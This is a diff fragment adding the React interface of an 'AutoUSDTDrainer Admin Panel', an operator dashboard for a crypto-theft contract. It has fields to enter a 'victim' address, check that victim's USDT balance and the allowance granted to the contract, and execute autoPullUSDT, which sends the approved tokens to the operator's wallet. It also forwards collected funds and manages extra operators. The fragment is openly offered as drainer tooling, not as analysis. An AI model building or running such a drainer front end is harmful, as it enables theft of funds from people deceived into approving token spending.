+    const canCheckVictim = isWalletConnected && isValidAddress(victimAddressInput);
+
+    return (
+        <div className="container">
+            <h1>Advanced AutoUSDTDrainer Admin Panel</h1>
+            <p style={{ textAlign: 'center', color: '#666' }}>Interact with your deployed smart contract.</p>
+
+            <hr />
+
+            <div className="wallet-info">
+                <button onClick={connectWallet} disabled={isWalletConnected}>
+                    {isWalletConnected ? 'Wallet Connected' : 'Connect Wallet'}
+                </button>
+                <p style={{ marginTop: '15px' }}><strong>Status:</strong> {connectedAccount || 'Not Connected'}</p>
+                <p style={{ marginTop: '5px' }}><strong>Network:</strong> {network}</p>
+                {connectedAccount && (
+                    <p style={{ marginTop: '5px' }}>
+                        <strong>Role:</strong> {isOwner ? 'Owner' : (isOperator ? 'Operator' : 'Regular User')}
+                    </p>
+                )}
+            </div>
+
+            <div id="status" className={`status-message ${status.type}`}>{status.message}</div>
+
+            <hr />
+
+            <div className="function-group">
+                <h2 className="section-title">Token Drainer</h2>
+                <p style={{ color: '#555', marginBottom: '20px' }}>Input a victim's address to check their USDT balance and the allowance given to your contract, then drain approved tokens.</p>
+                <div>
+                    <label htmlFor="victimAddressDrain">Victim Address (approved this contract):</label>
+                    <input
+                        type="text"
+                        id="victimAddressDrain"
+                        placeholder="e.g., 0xAbc...123"
+                        value={victimAddressInput}
+                        onChange={(e) => {
+                            setVictimAddressInput(e.target.value);
+                            // Reset victim info on input change
+                            setVictimUSDTBalance('N/A');
+                            setVictimAllowance('N/A');
+                            setAmountToPull('N/A');
+                        }}
+                    />
+                    <button onClick={checkVictimBalanceAndAllowance} disabled={!canCheckVictim}>
+                        Check Victim's USDT
+                    </button>
+                </div>
+                <div className="data-display">
+                    <p><strong>Victim USDT Balance:</strong> <span id="victimUSDTBalance">{victimUSDTBalance}</span></p>
+                    <p><strong>Allowance to My Contract:</strong> <span id="victimAllowance">{victimAllowance}</span></p>
+                    <p><strong>Tokens to Pull (Min of above):</strong> <span id="amountToPullDisplay">{amountToPull}</span></p>
+                </div>
+                <div style={{ marginTop: '20px' }}>
+                    <label htmlFor="destinationAddressDrain">Destination Address (auto-filled with your connected wallet):</label>
+                    <input
+                        type="text"
+                        id="destinationAddressDrain"
+                        value={destinationAddressInput}
+                        readOnly
+                    />
+                </div>
+                <button onClick={handlePullUsdt} disabled={!canPullUSDT}>
+                    Execute autoPullUSDT
+                </button>
+            </div>
+
+            <div className="function-group">
+                <h2 className="section-title">Forward Contract's Collected USDT</h2>
+                <p style={{ color: '#555', marginBottom: '20px' }}>If USDT was sent directly to this contract, use this to forward it.</p>
+                <div>
+                    <label htmlFor="forwardToAddress">Forward To Address (auto-filled with your connected wallet):</label>
+                    <input
+                        type="text"
+                        id="forwardToAddress"
+                        value={forwardToAddressInput}
+                        readOnly
+                    />
+                </div>
+                <button onClick={handleForwardCollected} disabled={!canForwardCollected}>
+                    Execute forwardCollected
+                </button>
+            </div>
+
+            <div className="function-group">
+                <h2 className="section-title">Manage Operators</h2>
+                <p style={{ color: '#555', marginBottom: '20px' }}>Add or remove addresses authorized to call `autoPullUSDT` (besides the owner).</p>
+                <div>
+                    <label htmlFor="operatorAddress">Operator Address:</label>
+                    <input
+                        type="text"
+                        id="operatorAddress"
+                        placeholder="e.g., 0xDef...456"
+                        value={operatorAddressInput}
+                        onChange={(e) => setOperatorAddressInput(e.target.value)}
+                    />
+                </div>
+                <div style={{ display: 'flex', gap: '10px' }}>
+                    <button onClick={handleAddOperator} disabled={!canManageOperators}>
+                        Add Operator
+                    </button>
+                    <button onClick={handleRemoveOperator} disabled={!canManageOperators}>
+                        Remove Operator
+                    </button>
+                </div>
+            </div>
+
+            <div className="function-group">
+                <h2 className="section-title">Read Contract Data</h2>
+                <p style={{ color: '#555', marginBottom: '20px' }}>Check contract owner, balance, and token address.</p>
+                <div>
+                    <button onClick={getContractInfo} disabled={!isWalletConnected}>
+                        Refresh Contract Info
+                    </button>
+                    <p style={{ marginTop: '15px' }}><strong>Contract Owner:</strong> <span id="displayOwner">{contractOwnerAddress}</span></p>
+                    <p><strong>Contract USDT Balance:</strong> <span id="displayUSDTBalance">{contractUSDTBalance}</span></p>
+                    <p><strong>USDT Token Address:</strong> <span id="displayUSDTTokenAddress">{contractUSDTTokenAddress}</span></p>
+                </div>
+            </div>
+        </div>
+    );
+}
+
+export default App;
